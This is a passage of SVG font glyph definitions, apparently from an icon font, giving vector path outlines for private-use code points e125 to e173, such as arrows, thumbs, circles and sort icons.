<glyph unicode="&#xe125;" d="M650 1200h50q40 0 70 -40.5t30 -84.5v-150l-28 -125h328q40 0 70 -40.5t30 -84.5v-100q0 -45 -29 -74l-238 -344q-16 -24 -38 -40.5t-45 -16.5h-250q-7 0 -42 25t-66 50l-31 25h-61q-45 0 -72.5 18t-27.5 57v400q0 36 20 63l145 196l96 198q13 28 37.5 48t51.5 20z M650 1100l-100 -212l-150 -213v-375h100l136 -100h214l250 375v125h-450l50 225v175h-50zM50 800h100q21 0 35.5 -14.5t14.5 -35.5v-500q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v500q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe126;" d="M600 1100h250q23 0 45 -16.5t38 -40.5l238 -344q29 -29 29 -74v-100q0 -44 -30 -84.5t-70 -40.5h-328q28 -118 28 -125v-150q0 -44 -30 -84.5t-70 -40.5h-50q-27 0 -51.5 20t-37.5 48l-96 198l-145 196q-20 27 -20 63v400q0 39 27.5 57t72.5 18h61q124 100 139 100z M50 1000h100q21 0 35.5 -14.5t14.5 -35.5v-500q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v500q0 21 14.5 35.5t35.5 14.5zM636 1000l-136 -100h-100v-375l150 -213l100 -212h50v175l-50 225h450v125l-250 375h-214z" />
<glyph unicode="&#xe127;" d="M356 873l363 230q31 16 53 -6l110 -112q13 -13 13.5 -32t-11.5 -34l-84 -121h302q84 0 138 -38t54 -110t-55 -111t-139 -39h-106l-131 -339q-6 -21 -19.5 -41t-28.5 -20h-342q-7 0 -90 81t-83 94v525q0 17 14 35.5t28 28.5zM400 792v-503l100 -89h293l131 339 q6 21 19.5 41t28.5 20h203q21 0 30.5 25t0.5 50t-31 25h-456h-7h-6h-5.5t-6 0.5t-5 1.5t-5 2t-4 2.5t-4 4t-2.5 4.5q-12 25 5 47l146 183l-86 83zM50 800h100q21 0 35.5 -14.5t14.5 -35.5v-500q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v500 q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe128;" d="M475 1103l366 -230q2 -1 6 -3.5t14 -10.5t18 -16.5t14.5 -20t6.5 -22.5v-525q0 -13 -86 -94t-93 -81h-342q-15 0 -28.5 20t-19.5 41l-131 339h-106q-85 0 -139.5 39t-54.5 111t54 110t138 38h302l-85 121q-11 15 -10.5 34t13.5 32l110 112q22 22 53 6zM370 945l146 -183 q17 -22 5 -47q-2 -2 -3.5 -4.5t-4 -4t-4 -2.5t-5 -2t-5 -1.5t-6 -0.5h-6h-6.5h-6h-475v-100h221q15 0 29 -20t20 -41l130 -339h294l106 89v503l-342 236zM1050 800h100q21 0 35.5 -14.5t14.5 -35.5v-500q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5 v500q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe129;" d="M550 1294q72 0 111 -55t39 -139v-106l339 -131q21 -6 41 -19.5t20 -28.5v-342q0 -7 -81 -90t-94 -83h-525q-17 0 -35.5 14t-28.5 28l-9 14l-230 363q-16 31 6 53l112 110q13 13 32 13.5t34 -11.5l121 -84v302q0 84 38 138t110 54zM600 972v203q0 21 -25 30.5t-50 0.5 t-25 -31v-456v-7v-6v-5.5t-0.5 -6t-1.5 -5t-2 -5t-2.5 -4t-4 -4t-4.5 -2.5q-25 -12 -47 5l-183 146l-83 -86l236 -339h503l89 100v293l-339 131q-21 6 -41 19.5t-20 28.5zM450 200h500q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-500 q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe130;" d="M350 1100h500q21 0 35.5 14.5t14.5 35.5v100q0 21 -14.5 35.5t-35.5 14.5h-500q-21 0 -35.5 -14.5t-14.5 -35.5v-100q0 -21 14.5 -35.5t35.5 -14.5zM600 306v-106q0 -84 -39 -139t-111 -55t-110 54t-38 138v302l-121 -84q-15 -12 -34 -11.5t-32 13.5l-112 110 q-22 22 -6 53l230 363q1 2 3.5 6t10.5 13.5t16.5 17t20 13.5t22.5 6h525q13 0 94 -83t81 -90v-342q0 -15 -20 -28.5t-41 -19.5zM308 900l-236 -339l83 -86l183 146q22 17 47 5q2 -1 4.5 -2.5t4 -4t2.5 -4t2 -5t1.5 -5t0.5 -6v-5.5v-6v-7v-456q0 -22 25 -31t50 0.5t25 30.5 v203q0 15 20 28.5t41 19.5l339 131v293l-89 100h-503z" />
<glyph unicode="&#xe131;" d="M600 1178q118 0 225 -45.5t184.5 -123t123 -184.5t45.5 -225t-45.5 -225t-123 -184.5t-184.5 -123t-225 -45.5t-225 45.5t-184.5 123t-123 184.5t-45.5 225t45.5 225t123 184.5t184.5 123t225 45.5zM914 632l-275 223q-16 13 -27.5 8t-11.5 -26v-137h-275 q-10 0 -17.5 -7.5t-7.5 -17.5v-150q0 -10 7.5 -17.5t17.5 -7.5h275v-137q0 -21 11.5 -26t27.5 8l275 223q16 13 16 32t-16 32z" />
<glyph unicode="&#xe132;" d="M600 1178q118 0 225 -45.5t184.5 -123t123 -184.5t45.5 -225t-45.5 -225t-123 -184.5t-184.5 -123t-225 -45.5t-225 45.5t-184.5 123t-123 184.5t-45.5 225t45.5 225t123 184.5t184.5 123t225 45.5zM561 855l-275 -223q-16 -13 -16 -32t16 -32l275 -223q16 -13 27.5 -8 t11.5 26v137h275q10 0 17.5 7.5t7.5 17.5v150q0 10 -7.5 17.5t-17.5 7.5h-275v137q0 21 -11.5 26t-27.5 -8z" />
<glyph unicode="&#xe133;" d="M600 1178q118 0 225 -45.5t184.5 -123t123 -184.5t45.5 -225t-45.5 -225t-123 -184.5t-184.5 -123t-225 -45.5t-225 45.5t-184.5 123t-123 184.5t-45.5 225t45.5 225t123 184.5t184.5 123t225 45.5zM855 639l-223 275q-13 16 -32 16t-32 -16l-223 -275q-13 -16 -8 -27.5 t26 -11.5h137v-275q0 -10 7.5 -17.5t17.5 -7.5h150q10 0 17.5 7.5t7.5 17.5v275h137q21 0 26 11.5t-8 27.5z" />
<glyph unicode="&#xe134;" d="M600 1178q118 0 225 -45.5t184.5 -123t123 -184.5t45.5 -225t-45.5 -225t-123 -184.5t-184.5 -123t-225 -45.5t-225 45.5t-184.5 123t-123 184.5t-45.5 225t45.5 225t123 184.5t184.5 123t225 45.5zM675 900h-150q-10 0 -17.5 -7.5t-7.5 -17.5v-275h-137q-21 0 -26 -11.5 t8 -27.5l223 -275q13 -16 32 -16t32 16l223 275q13 16 8 27.5t-26 11.5h-137v275q0 10 -7.5 17.5t-17.5 7.5z" />
<glyph unicode="&#xe135;" d="M600 1176q116 0 222.5 -46t184 -123.5t123.5 -184t46 -222.5t-46 -222.5t-123.5 -184t-184 -123.5t-222.5 -46t-222.5 46t-184 123.5t-123.5 184t-46 222.5t46 222.5t123.5 184t184 123.5t222.5 46zM627 1101q-15 -12 -36.5 -20.5t-35.5 -12t-43 -8t-39 -6.5 q-15 -3 -45.5 0t-45.5 -2q-20 -7 -51.5 -26.5t-34.5 -34.5q-3 -11 6.5 -22.5t8.5 -18.5q-3 -34 -27.5 -91t-29.5 -79q-9 -34 5 -93t8 -87q0 -9 17 -44.5t16 -59.5q12 0 23 -5t23.5 -15t19.5 -14q16 -8 33 -15t40.5 -15t34.5 -12q21 -9 52.5 -32t60 -38t57.5 -11 q7 -15 -3 -34t-22.5 -40t-9.5 -38q13 -21 23 -34.5t27.5 -27.5t36.5 -18q0 -7 -3.5 -16t-3.5 -14t5 -17q104 -2 221 112q30 29 46.5 47t34.5 49t21 63q-13 8 -37 8.5t-36 7.5q-15 7 -49.5 15t-51.5 19q-18 0 -41 -0.5t-43 -1.5t-42 -6.5t-38 -16.5q-51 -35 -66 -12 q-4 1 -3.5 25.5t0.5 25.5q-6 13 -26.5 17.5t-24.5 6.5q1 15 -0.5 30.5t-7 28t-18.5 11.5t-31 -21q-23 -25 -42 4q-19 28 -8 58q6 16 22 22q6 -1 26 -1.5t33.5 -4t19.5 -13.5q7 -12 18 -24t21.5 -20.5t20 -15t15.5 -10.5l5 -3q2 12 7.5 30.5t8 34.5t-0.5 32q-3 18 3.5 29 t18 22.5t15.5 24.5q6 14 10.5 35t8 31t15.5 22.5t34 22.5q-6 18 10 36q8 0 24 -1.5t24.5 -1.5t20 4.5t20.5 15.5q-10 23 -31 42.5t-37.5 29.5t-49 27t-43.5 23q0 1 2 8t3 11.5t1.5 10.5t-1 9.5t-4.5 4.5q31 -13 58.5 -14.5t38.5 2.5l12 5q5 28 -9.5 46t-36.5 24t-50 15 t-41 20q-18 -4 -37 0zM613 994q0 -17 8 -42t17 -45t9 -23q-8 1 -39.5 5.5t-52.5 10t-37 16.5q3 11 16 29.5t16 25.5q10 -10 19 -10t14 6t13.5 14.5t16.5 12.5z" />
<glyph unicode="&#xe136;" d="M756 1157q164 92 306 -9l-259 -138l145 -232l251 126q6 -89 -34 -156.5t-117 -110.5q-60 -34 -127 -39.5t-126 16.5l-596 -596q-15 -16 -36.5 -16t-36.5 16l-111 110q-15 15 -15 36.5t15 37.5l600 599q-34 101 5.5 201.5t135.5 154.5z" />
<glyph unicode="&#xe137;" horiz-adv-x="1220" d="M100 1196h1000q41 0 70.5 -29.5t29.5 -70.5v-100q0 -41 -29.5 -70.5t-70.5 -29.5h-1000q-41 0 -70.5 29.5t-29.5 70.5v100q0 41 29.5 70.5t70.5 29.5zM1100 1096h-200v-100h200v100zM100 796h1000q41 0 70.5 -29.5t29.5 -70.5v-100q0 -41 -29.5 -70.5t-70.5 -29.5h-1000 q-41 0 -70.5 29.5t-29.5 70.5v100q0 41 29.5 70.5t70.5 29.5zM1100 696h-500v-100h500v100zM100 396h1000q41 0 70.5 -29.5t29.5 -70.5v-100q0 -41 -29.5 -70.5t-70.5 -29.5h-1000q-41 0 -70.5 29.5t-29.5 70.5v100q0 41 29.5 70.5t70.5 29.5zM1100 296h-300v-100h300v100z " />
<glyph unicode="&#xe138;" d="M150 1200h900q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-900q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5zM700 500v-300l-200 -200v500l-350 500h900z" />
<glyph unicode="&#xe139;" d="M500 1200h200q41 0 70.5 -29.5t29.5 -70.5v-100h300q41 0 70.5 -29.5t29.5 -70.5v-400h-500v100h-200v-100h-500v400q0 41 29.5 70.5t70.5 29.5h300v100q0 41 29.5 70.5t70.5 29.5zM500 1100v-100h200v100h-200zM1200 400v-200q0 -41 -29.5 -70.5t-70.5 -29.5h-1000 q-41 0 -70.5 29.5t-29.5 70.5v200h1200z" />
<glyph unicode="&#xe140;" d="M50 1200h300q21 0 25 -10.5t-10 -24.5l-94 -94l199 -199q7 -8 7 -18t-7 -18l-106 -106q-8 -7 -18 -7t-18 7l-199 199l-94 -94q-14 -14 -24.5 -10t-10.5 25v300q0 21 14.5 35.5t35.5 14.5zM850 1200h300q21 0 35.5 -14.5t14.5 -35.5v-300q0 -21 -10.5 -25t-24.5 10l-94 94 l-199 -199q-8 -7 -18 -7t-18 7l-106 106q-7 8 -7 18t7 18l199 199l-94 94q-14 14 -10 24.5t25 10.5zM364 470l106 -106q7 -8 7 -18t-7 -18l-199 -199l94 -94q14 -14 10 -24.5t-25 -10.5h-300q-21 0 -35.5 14.5t-14.5 35.5v300q0 21 10.5 25t24.5 -10l94 -94l199 199 q8 7 18 7t18 -7zM1071 271l94 94q14 14 24.5 10t10.5 -25v-300q0 -21 -14.5 -35.5t-35.5 -14.5h-300q-21 0 -25 10.5t10 24.5l94 94l-199 199q-7 8 -7 18t7 18l106 106q8 7 18 7t18 -7z" />
<glyph unicode="&#xe141;" d="M596 1192q121 0 231.5 -47.5t190 -127t127 -190t47.5 -231.5t-47.5 -231.5t-127 -190.5t-190 -127t-231.5 -47t-231.5 47t-190.5 127t-127 190.5t-47 231.5t47 231.5t127 190t190.5 127t231.5 47.5zM596 1010q-112 0 -207.5 -55.5t-151 -151t-55.5 -207.5t55.5 -207.5 t151 -151t207.5 -55.5t207.5 55.5t151 151t55.5 207.5t-55.5 207.5t-151 151t-207.5 55.5zM454.5 905q22.5 0 38.5 -16t16 -38.5t-16 -39t-38.5 -16.5t-38.5 16.5t-16 39t16 38.5t38.5 16zM754.5 905q22.5 0 38.5 -16t16 -38.5t-16 -39t-38 -16.5q-14 0 -29 10l-55 -145 q17 -23 17 -51q0 -36 -25.5 -61.5t-61.5 -25.5t-61.5 25.5t-25.5 61.5q0 32 20.5 56.5t51.5 29.5l122 126l1 1q-9 14 -9 28q0 23 16 39t38.5 16zM345.5 709q22.5 0 38.5 -16t16 -38.5t-16 -38.5t-38.5 -16t-38.5 16t-16 38.5t16 38.5t38.5 16zM854.5 709q22.5 0 38.5 -16 t16 -38.5t-16 -38.5t-38.5 -16t-38.5 16t-16 38.5t16 38.5t38.5 16z" />
<glyph unicode="&#xe142;" d="M546 173l469 470q91 91 99 192q7 98 -52 175.5t-154 94.5q-22 4 -47 4q-34 0 -66.5 -10t-56.5 -23t-55.5 -38t-48 -41.5t-48.5 -47.5q-376 -375 -391 -390q-30 -27 -45 -41.5t-37.5 -41t-32 -46.5t-16 -47.5t-1.5 -56.5q9 -62 53.5 -95t99.5 -33q74 0 125 51l548 548 q36 36 20 75q-7 16 -21.5 26t-32.5 10q-26 0 -50 -23q-13 -12 -39 -38l-341 -338q-15 -15 -35.5 -15.5t-34.5 13.5t-14 34.5t14 34.5q327 333 361 367q35 35 67.5 51.5t78.5 16.5q14 0 29 -1q44 -8 74.5 -35.5t43.5 -68.5q14 -47 2 -96.5t-47 -84.5q-12 -11 -32 -32 t-79.5 -81t-114.5 -115t-124.5 -123.5t-123 -119.5t-96.5 -89t-57 -45q-56 -27 -120 -27q-70 0 -129 32t-93 89q-48 78 -35 173t81 163l511 511q71 72 111 96q91 55 198 55q80 0 152 -33q78 -36 129.5 -103t66.5 -154q17 -93 -11 -183.5t-94 -156.5l-482 -476 q-15 -15 -36 -16t-37 14t-17.5 34t14.5 35z" />
<glyph unicode="&#xe143;" d="M649 949q48 68 109.5 104t121.5 38.5t118.5 -20t102.5 -64t71 -100.5t27 -123q0 -57 -33.5 -117.5t-94 -124.5t-126.5 -127.5t-150 -152.5t-146 -174q-62 85 -145.5 174t-150 152.5t-126.5 127.5t-93.5 124.5t-33.5 117.5q0 64 28 123t73 100.5t104 64t119 20 t120.5 -38.5t104.5 -104zM896 972q-33 0 -64.5 -19t-56.5 -46t-47.5 -53.5t-43.5 -45.5t-37.5 -19t-36 19t-40 45.5t-43 53.5t-54 46t-65.5 19q-67 0 -122.5 -55.5t-55.5 -132.5q0 -23 13.5 -51t46 -65t57.5 -63t76 -75l22 -22q15 -14 44 -44t50.5 -51t46 -44t41 -35t23 -12 t23.5 12t42.5 36t46 44t52.5 52t44 43q4 4 12 13q43 41 63.5 62t52 55t46 55t26 46t11.5 44q0 79 -53 133.5t-120 54.5z" />
<glyph unicode="&#xe144;" d="M776.5 1214q93.5 0 159.5 -66l141 -141q66 -66 66 -160q0 -42 -28 -95.5t-62 -87.5l-29 -29q-31 53 -77 99l-18 18l95 95l-247 248l-389 -389l212 -212l-105 -106l-19 18l-141 141q-66 66 -66 159t66 159l283 283q65 66 158.5 66zM600 706l105 105q10 -8 19 -17l141 -141 q66 -66 66 -159t-66 -159l-283 -283q-66 -66 -159 -66t-159 66l-141 141q-66 66 -66 159.5t66 159.5l55 55q29 -55 75 -102l18 -17l-95 -95l247 -248l389 389z" />
<glyph unicode="&#xe145;" d="M603 1200q85 0 162 -15t127 -38t79 -48t29 -46v-953q0 -41 -29.5 -70.5t-70.5 -29.5h-600q-41 0 -70.5 29.5t-29.5 70.5v953q0 21 30 46.5t81 48t129 37.5t163 15zM300 1000v-700h600v700h-600zM600 254q-43 0 -73.5 -30.5t-30.5 -73.5t30.5 -73.5t73.5 -30.5t73.5 30.5 t30.5 73.5t-30.5 73.5t-73.5 30.5z" />
<glyph unicode="&#xe146;" d="M902 1185l283 -282q15 -15 15 -36t-14.5 -35.5t-35.5 -14.5t-35 15l-36 35l-279 -267v-300l-212 210l-308 -307l-280 -203l203 280l307 308l-210 212h300l267 279l-35 36q-15 14 -15 35t14.5 35.5t35.5 14.5t35 -15z" />
<glyph unicode="&#xe148;" d="M700 1248v-78q38 -5 72.5 -14.5t75.5 -31.5t71 -53.5t52 -84t24 -118.5h-159q-4 36 -10.5 59t-21 45t-40 35.5t-64.5 20.5v-307l64 -13q34 -7 64 -16.5t70 -32t67.5 -52.5t47.5 -80t20 -112q0 -139 -89 -224t-244 -97v-77h-100v79q-150 16 -237 103q-40 40 -52.5 93.5 t-15.5 139.5h139q5 -77 48.5 -126t117.5 -65v335l-27 8q-46 14 -79 26.5t-72 36t-63 52t-40 72.5t-16 98q0 70 25 126t67.5 92t94.5 57t110 27v77h100zM600 754v274q-29 -4 -50 -11t-42 -21.5t-31.5 -41.5t-10.5 -65q0 -29 7 -50.5t16.5 -34t28.5 -22.5t31.5 -14t37.5 -10 q9 -3 13 -4zM700 547v-310q22 2 42.5 6.5t45 15.5t41.5 27t29 42t12 59.5t-12.5 59.5t-38 44.5t-53 31t-66.5 24.5z" />
<glyph unicode="&#xe149;" d="M561 1197q84 0 160.5 -40t123.5 -109.5t47 -147.5h-153q0 40 -19.5 71.5t-49.5 48.5t-59.5 26t-55.5 9q-37 0 -79 -14.5t-62 -35.5q-41 -44 -41 -101q0 -26 13.5 -63t26.5 -61t37 -66q6 -9 9 -14h241v-100h-197q8 -50 -2.5 -115t-31.5 -95q-45 -62 -99 -112 q34 10 83 17.5t71 7.5q32 1 102 -16t104 -17q83 0 136 30l50 -147q-31 -19 -58 -30.5t-55 -15.5t-42 -4.5t-46 -0.5q-23 0 -76 17t-111 32.5t-96 11.5q-39 -3 -82 -16t-67 -25l-23 -11l-55 145q4 3 16 11t15.5 10.5t13 9t15.5 12t14.5 14t17.5 18.5q48 55 54 126.5 t-30 142.5h-221v100h166q-23 47 -44 104q-7 20 -12 41.5t-6 55.5t6 66.5t29.5 70.5t58.5 71q97 88 263 88z" />
<glyph unicode="&#xe150;" d="M400 300h150q21 0 25 -11t-10 -25l-230 -250q-14 -15 -35 -15t-35 15l-230 250q-14 14 -10 25t25 11h150v900h200v-900zM935 1184l230 -249q14 -14 10 -24.5t-25 -10.5h-150v-900h-200v900h-150q-21 0 -25 10.5t10 24.5l230 249q14 15 35 15t35 -15z" />
<glyph unicode="&#xe151;" d="M1000 700h-100v100h-100v-100h-100v500h300v-500zM400 300h150q21 0 25 -11t-10 -25l-230 -250q-14 -15 -35 -15t-35 15l-230 250q-14 14 -10 25t25 11h150v900h200v-900zM801 1100v-200h100v200h-100zM1000 350l-200 -250h200v-100h-300v150l200 250h-200v100h300v-150z " />
<glyph unicode="&#xe152;" d="M400 300h150q21 0 25 -11t-10 -25l-230 -250q-14 -15 -35 -15t-35 15l-230 250q-14 14 -10 25t25 11h150v900h200v-900zM1000 1050l-200 -250h200v-100h-300v150l200 250h-200v100h300v-150zM1000 0h-100v100h-100v-100h-100v500h300v-500zM801 400v-200h100v200h-100z " />
<glyph unicode="&#xe153;" d="M400 300h150q21 0 25 -11t-10 -25l-230 -250q-14 -15 -35 -15t-35 15l-230 250q-14 14 -10 25t25 11h150v900h200v-900zM1000 700h-100v400h-100v100h200v-500zM1100 0h-100v100h-200v400h300v-500zM901 400v-200h100v200h-100z" />
<glyph unicode="&#xe154;" d="M400 300h150q21 0 25 -11t-10 -25l-230 -250q-14 -15 -35 -15t-35 15l-230 250q-14 14 -10 25t25 11h150v900h200v-900zM1100 700h-100v100h-200v400h300v-500zM901 1100v-200h100v200h-100zM1000 0h-100v400h-100v100h200v-500z" />
<glyph unicode="&#xe155;" d="M400 300h150q21 0 25 -11t-10 -25l-230 -250q-14 -15 -35 -15t-35 15l-230 250q-14 14 -10 25t25 11h150v900h200v-900zM900 1000h-200v200h200v-200zM1000 700h-300v200h300v-200zM1100 400h-400v200h400v-200zM1200 100h-500v200h500v-200z" />
<glyph unicode="&#xe156;" d="M400 300h150q21 0 25 -11t-10 -25l-230 -250q-14 -15 -35 -15t-35 15l-230 250q-14 14 -10 25t25 11h150v900h200v-900zM1200 1000h-500v200h500v-200zM1100 700h-400v200h400v-200zM1000 400h-300v200h300v-200zM900 100h-200v200h200v-200z" />
<glyph unicode="&#xe157;" d="M350 1100h400q162 0 256 -93.5t94 -256.5v-400q0 -165 -93.5 -257.5t-256.5 -92.5h-400q-165 0 -257.5 92.5t-92.5 257.5v400q0 165 92.5 257.5t257.5 92.5zM800 900h-500q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5 v500q0 41 -29.5 70.5t-70.5 29.5z" />
<glyph unicode="&#xe158;" d="M350 1100h400q165 0 257.5 -92.5t92.5 -257.5v-400q0 -165 -92.5 -257.5t-257.5 -92.5h-400q-163 0 -256.5 92.5t-93.5 257.5v400q0 163 94 256.5t256 93.5zM800 900h-500q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5 v500q0 41 -29.5 70.5t-70.5 29.5zM440 770l253 -190q17 -12 17 -30t-17 -30l-253 -190q-16 -12 -28 -6.5t-12 26.5v400q0 21 12 26.5t28 -6.5z" />
<glyph unicode="&#xe159;" d="M350 1100h400q163 0 256.5 -94t93.5 -256v-400q0 -165 -92.5 -257.5t-257.5 -92.5h-400q-165 0 -257.5 92.5t-92.5 257.5v400q0 163 92.5 256.5t257.5 93.5zM800 900h-500q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5 v500q0 41 -29.5 70.5t-70.5 29.5zM350 700h400q21 0 26.5 -12t-6.5 -28l-190 -253q-12 -17 -30 -17t-30 17l-190 253q-12 16 -6.5 28t26.5 12z" />
<glyph unicode="&#xe160;" d="M350 1100h400q165 0 257.5 -92.5t92.5 -257.5v-400q0 -163 -92.5 -256.5t-257.5 -93.5h-400q-163 0 -256.5 94t-93.5 256v400q0 165 92.5 257.5t257.5 92.5zM800 900h-500q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5 v500q0 41 -29.5 70.5t-70.5 29.5zM580 693l190 -253q12 -16 6.5 -28t-26.5 -12h-400q-21 0 -26.5 12t6.5 28l190 253q12 17 30 17t30 -17z" />
<glyph unicode="&#xe161;" d="M550 1100h400q165 0 257.5 -92.5t92.5 -257.5v-400q0 -165 -92.5 -257.5t-257.5 -92.5h-400q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5h450q41 0 70.5 29.5t29.5 70.5v500q0 41 -29.5 70.5t-70.5 29.5h-450q-21 0 -35.5 14.5t-14.5 35.5v100 q0 21 14.5 35.5t35.5 14.5zM338 867l324 -284q16 -14 16 -33t-16 -33l-324 -284q-16 -14 -27 -9t-11 26v150h-250q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5h250v150q0 21 11 26t27 -9z" />
<glyph unicode="&#xe162;" d="M793 1182l9 -9q8 -10 5 -27q-3 -11 -79 -225.5t-78 -221.5l300 1q24 0 32.5 -17.5t-5.5 -35.5q-1 0 -133.5 -155t-267 -312.5t-138.5 -162.5q-12 -15 -26 -15h-9l-9 8q-9 11 -4 32q2 9 42 123.5t79 224.5l39 110h-302q-23 0 -31 19q-10 21 6 41q75 86 209.5 237.5 t228 257t98.5 111.5q9 16 25 16h9z" />
<glyph unicode="&#xe163;" d="M350 1100h400q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-450q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h450q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-165 0 -257.5 92.5t-92.5 257.5v400 q0 165 92.5 257.5t257.5 92.5zM938 867l324 -284q16 -14 16 -33t-16 -33l-324 -284q-16 -14 -27 -9t-11 26v150h-250q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5h250v150q0 21 11 26t27 -9z" />
<glyph unicode="&#xe164;" d="M750 1200h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -10.5 -25t-24.5 10l-109 109l-312 -312q-15 -15 -35.5 -15t-35.5 15l-141 141q-15 15 -15 35.5t15 35.5l312 312l-109 109q-14 14 -10 24.5t25 10.5zM456 900h-156q-41 0 -70.5 -29.5t-29.5 -70.5v-500 q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5v148l200 200v-298q0 -165 -93.5 -257.5t-256.5 -92.5h-400q-165 0 -257.5 92.5t-92.5 257.5v400q0 165 92.5 257.5t257.5 92.5h300z" />
<glyph unicode="&#xe165;" d="M600 1186q119 0 227.5 -46.5t187 -125t125 -187t46.5 -227.5t-46.5 -227.5t-125 -187t-187 -125t-227.5 -46.5t-227.5 46.5t-187 125t-125 187t-46.5 227.5t46.5 227.5t125 187t187 125t227.5 46.5zM600 1022q-115 0 -212 -56.5t-153.5 -153.5t-56.5 -212t56.5 -212 t153.5 -153.5t212 -56.5t212 56.5t153.5 153.5t56.5 212t-56.5 212t-153.5 153.5t-212 56.5zM600 794q80 0 137 -57t57 -137t-57 -137t-137 -57t-137 57t-57 137t57 137t137 57z" />
<glyph unicode="&#xe166;" d="M450 1200h200q21 0 35.5 -14.5t14.5 -35.5v-350h245q20 0 25 -11t-9 -26l-383 -426q-14 -15 -33.5 -15t-32.5 15l-379 426q-13 15 -8.5 26t25.5 11h250v350q0 21 14.5 35.5t35.5 14.5zM50 300h1000q21 0 35.5 -14.5t14.5 -35.5v-250h-1100v250q0 21 14.5 35.5t35.5 14.5z M900 200v-50h100v50h-100z" />
<glyph unicode="&#xe167;" d="M583 1182l378 -435q14 -15 9 -31t-26 -16h-244v-250q0 -20 -17 -35t-39 -15h-200q-20 0 -32 14.5t-12 35.5v250h-250q-20 0 -25.5 16.5t8.5 31.5l383 431q14 16 33.5 17t33.5 -14zM50 300h1000q21 0 35.5 -14.5t14.5 -35.5v-250h-1100v250q0 21 14.5 35.5t35.5 14.5z M900 200v-50h100v50h-100z" />
<glyph unicode="&#xe168;" d="M396 723l369 369q7 7 17.5 7t17.5 -7l139 -139q7 -8 7 -18.5t-7 -17.5l-525 -525q-7 -8 -17.5 -8t-17.5 8l-292 291q-7 8 -7 18t7 18l139 139q8 7 18.5 7t17.5 -7zM50 300h1000q21 0 35.5 -14.5t14.5 -35.5v-250h-1100v250q0 21 14.5 35.5t35.5 14.5zM900 200v-50h100v50 h-100z" />
<glyph unicode="&#xe169;" d="M135 1023l142 142q14 14 35 14t35 -14l77 -77l-212 -212l-77 76q-14 15 -14 36t14 35zM655 855l210 210q14 14 24.5 10t10.5 -25l-2 -599q-1 -20 -15.5 -35t-35.5 -15l-597 -1q-21 0 -25 10.5t10 24.5l208 208l-154 155l212 212zM50 300h1000q21 0 35.5 -14.5t14.5 -35.5 v-250h-1100v250q0 21 14.5 35.5t35.5 14.5zM900 200v-50h100v50h-100z" />
<glyph unicode="&#xe170;" d="M350 1200l599 -2q20 -1 35 -15.5t15 -35.5l1 -597q0 -21 -10.5 -25t-24.5 10l-208 208l-155 -154l-212 212l155 154l-210 210q-14 14 -10 24.5t25 10.5zM524 512l-76 -77q-15 -14 -36 -14t-35 14l-142 142q-14 14 -14 35t14 35l77 77zM50 300h1000q21 0 35.5 -14.5 t14.5 -35.5v-250h-1100v250q0 21 14.5 35.5t35.5 14.5zM900 200v-50h100v50h-100z" />
<glyph unicode="&#xe171;" d="M1200 103l-483 276l-314 -399v423h-399l1196 796v-1096zM483 424v-230l683 953z" />
<glyph unicode="&#xe172;" d="M1100 1000v-850q0 -21 -14.5 -35.5t-35.5 -14.5h-150v400h-700v-400h-150q-21 0 -35.5 14.5t-14.5 35.5v1000q0 20 14.5 35t35.5 15h250v-300h500v300h100zM700 1000h-100v200h100v-200z" />
<glyph unicode="&#xe173;" d="M1100 1000l-2 -149l-299 -299l-95 95q-9 9 -21.5 9t-21.5 -9l-149 -147h-312v-400h-150q-21 0 -35.5 14.5t-14.5 35.5v1000q0 20 14.5 35t35.5 15h250v-300h500v300h100zM700 1000h-100v200h100v-200zM1132 638l106 -106q7 -7 7 -17.5t-7 -17.5l-420 -421q-8 -7 -18 -7 t-18 7l-202 203q-8 7 -8 17.5t8 17.5l106 106q7 8 17.5 8t17.5 -8l79 -79l297 297q7 7 17.5 7t17.5 -7z" />
